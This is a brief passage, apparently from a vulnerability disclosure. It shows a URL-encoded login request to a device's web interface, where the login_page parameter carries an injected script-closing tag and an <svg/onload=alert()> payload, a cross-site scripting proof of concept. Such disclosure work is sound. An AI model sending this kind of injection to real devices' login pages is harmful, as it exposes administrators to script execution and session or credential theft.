...
newUI=1&page=login&username=admin&langChange=0&ipaddr=192.168.6.1&homepage=main.shtml&login_page=login.shtml%3FM86062895"></script><svg/onload=alert()>&hostname=192.168.6.2&key=M86062895&password=290608fdb022310515454b2bbc3a8ec3&lang_select=0
```
